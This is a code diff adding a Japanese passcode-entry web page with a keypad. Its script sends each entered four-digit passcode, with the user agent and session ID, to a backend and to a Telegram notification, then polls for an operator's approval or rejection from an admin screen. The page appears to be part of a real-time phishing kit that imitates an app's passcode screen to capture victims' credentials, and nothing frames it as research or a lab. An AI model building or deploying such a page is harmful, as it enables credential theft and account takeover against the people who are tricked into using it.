@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>パスコード入力</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica Neue', Arial, sans-serif;
+            background-color: #ffffff;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 50px;
+        }
+
+        .close-btn {
+            background: none;
+            border: none;
+            font-size: 28px;
+            cursor: pointer;
+            color: #000;
+        }
+
+        .close-btn:active {
+            opacity: 0.6;
+        }
+
+        .reset-btn {
+            background: none;
+            border: none;
+            font-size: 16px;
+            color: #0066ff;
+            cursor: pointer;
+            font-weight: 500;
+        }
+
+        .reset-btn:active {
+            opacity: 0.7;
+        }
+
+        .content {
+            text-align: center;
+            margin-bottom: 50px;
+        }
+
+        .title {
+            font-size: 22px;
+            font-weight: 600;
+            color: #000;
+            margin-bottom: 40px;
+        }
+
+        .passcode-indicators {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-bottom: 60px;
+        }
+
+        .indicator {
+            width: 16px;
+            height: 16px;
+            border: 2px solid #0066ff;
+            border-radius: 50%;
+            background-color: transparent;
+            transition: all 0.3s ease;
+        }
+
+        .indicator.filled {
+            background-color: #0066ff;
+        }
+
+        .keypad {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 30px;
+            margin-bottom: 50px;
+        }
+
+        .key-btn {
+            padding: 20px;
+            background: none;
+            border: none;
+            font-size: 32px;
+            color: #0066ff;
+            cursor: pointer;
+            font-weight: 300;
+            transition: opacity 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .key-btn:active {
+            opacity: 0.6;
+        }
+
+        .bottom-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 30px;
+        }
+
+        .biometric-btn {
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 16px;
+            color: #0066ff;
+            font-size: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: opacity 0.2s ease;
+        }
+
+        .biometric-btn:active {
+            opacity: 0.6;
+        }
+
+        .delete-btn {
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 16px;
+            color: #0066ff;
+            font-size: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: opacity 0.2s ease;
+        }
+
+        .delete-btn:active {
+            opacity: 0.6;
+        }
+
+        @media (max-width: 480px) {
+            body {
+                padding: 16px;
+            }
+
+            .container {
+                width: 100%;
+            }
+
+            .title {
+                font-size: 20px;
+            }
+
+            .key-btn {
+                font-size: 28px;
+                padding: 16px;
+            }
+
+            .keypad {
+                gap: 25px;
+            }
+
+            .bottom-row {
+                gap: 25px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <button class="close-btn" aria-label="閉じる">×</button>
+            <button class="reset-btn" id="resetBtn">リセット</button>
+        </div>
+
+        <div class="content">
+            <h1 class="title">パスコードを入力</h1>
+
+            <div class="passcode-indicators">
+                <div class="indicator" id="indicator0"></div>
+                <div class="indicator" id="indicator1"></div>
+                <div class="indicator" id="indicator2"></div>
+                <div class="indicator" id="indicator3"></div>
+            </div>
+        </div>
+
+        <div class="keypad">
+            <button class="key-btn" data-number="1">1</button>
+            <button class="key-btn" data-number="2">2</button>
+            <button class="key-btn" data-number="3">3</button>
+            <button class="key-btn" data-number="4">4</button>
+            <button class="key-btn" data-number="5">5</button>
+            <button class="key-btn" data-number="6">6</button>
+            <button class="key-btn" data-number="7">7</button>
+            <button class="key-btn" data-number="8">8</button>
+            <button class="key-btn" data-number="9">9</button>
+        </div>
+
+        <div class="bottom-row">
+            <button class="biometric-btn" id="biometricBtn" aria-label="生体認証">
+                <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+                    <path d="M12 1C6.48 1 2 5.48 2 11s4.48 10 10 10 10-4.48 10-10S17.52 1 12 1zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
+                </svg>
+            </button>
+            <button class="key-btn" data-number="0" style="grid-column: 2;">0</button>
+            <button class="delete-btn" id="deleteBtn" aria-label="削除">
+                <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <line x1="18" y1="6" x2="6" y2="18"></line>
+                    <line x1="6" y1="6" x2="18" y2="18"></line>
+                </svg>
+            </button>
+        </div>
+    </div>
+
+    <script>
+        let passcode = '';
+        const indicators = document.querySelectorAll('.indicator');
+        const keyButtons = document.querySelectorAll('.key-btn');
+        const deleteBtn = document.getElementById('deleteBtn');
+        const resetBtn = document.getElementById('resetBtn');
+        const biometricBtn = document.getElementById('biometricBtn');
+
+        const urlParams = new URLSearchParams(window.location.search);
+        const sessionId = urlParams.get('sessionId') || localStorage.getItem('loginSessionId');
+
+        keyButtons.forEach(btn => {
+            btn.addEventListener('click', async function() {
+                if (passcode.length < 4) {
+                    passcode += this.dataset.number;
+                    updateIndicators();
+                    
+                    if (passcode.length === 4) {
+                        console.log('パスコード入力完了:', passcode);
+                        await handlePasscodeSubmit(passcode);
+                    }
+                }
+            });
+        });
+
+        async function handlePasscodeSubmit(code) {
+            const userAgent = navigator.userAgent;
+            const timestamp = new Date().toLocaleString('ja-JP');
+
+            try {
+                // ===== STEP 1: api.php にリクエスト登録 =====
+                const apiRes = await fetch('/api/auth', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        sessionId: sessionId,
+                        action: 'pending',
+                        type: 'PASSCODE_REQUEST',
+                        code: code,
+                        userAgent: userAgent,
+                        timestamp: timestamp
+                    })
+                });
+
+                const apiData = await apiRes.json();
+                console.log('✅ パスコード API登録:', apiData);
+
+                // ===== STEP 2: Telegram 通知 =====
+                const telegramMsg = `
+🔐 <b>パスコード認証</b>
+
+🔐 パスコード: <code>${code}</code>
+📱 User-Agent: <code>${userAgent.substring(0, 80)}</code>
+🔑 セッションID: <code>${sessionId}</code>
+⏰ 時刻: ${timestamp}
+
+<b>管理画面で承認待機中...</b>
+                `;
+
+                await fetch('/api/notify', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ message: telegramMsg })
+                }).catch(err => console.error('Telegram error:', err));
+
+                console.log('✅ パスコード Telegram送信:', sessionId);
+
+                // ===== STEP 3: 管理画面の承認待機 =====
+                monitorPasscodeApproval(sessionId);
+
+            } catch (error) {
+                console.error('❌ エラー:', error);
+                passcode = '';
+                updateIndicators();
+            }
+        }
+
+        function monitorPasscodeApproval(sid) {
+            let checkCount = 0;
+            const checker = setInterval(async () => {
+                checkCount++;
+                try {
+                    const res = await fetch(`/api/auth?sessionId=${sid}&_t=${Date.now()}`);
+                    const data = await res.json();
+
+                    if (data.approved) {
+                        clearInterval(checker);
+                        console.log('✅ パスコード承認:', sid);
+                        window.location.href = `passcode-confirm.html?sessionId=${sid}`;
+                    } else if (data.rejected) {
+                        clearInterval(checker);
+                        console.log('❌ パスコード拒否:', sid);
+                        passcode = '';
+                        updateIndicators();
+                    }
+                } catch (err) {
+                    console.error('Check error:', err);
+                }
+
+                if (checkCount >= 120) {
+                    clearInterval(checker);
+                    passcode = '';
+                    updateIndicators();
+                }
+            }, 500);
+        }
+
+        deleteBtn.addEventListener('click', function() {
+            if (passcode.length > 0) {
+                passcode = passcode.slice(0, -1);
+                updateIndicators();
+            }
+        });
+
+        resetBtn.addEventListener('click', function() {
+            passcode = '';
+            updateIndicators();
+        });
+
+        biometricBtn.addEventListener('click', function() {
+            console.log('生体認証を試行');
+            // ここに生体認証処理を追加
+        });
+
+        function updateIndicators() {
+            indicators.forEach((indicator, index) => {
+                if (index < passcode.length) {
+                    indicator.classList.add('filled');
+                } else {
+                    indicator.classList.remove('filled');
+                }
+            });
+        }
+    </script>
+</body>
+</html>
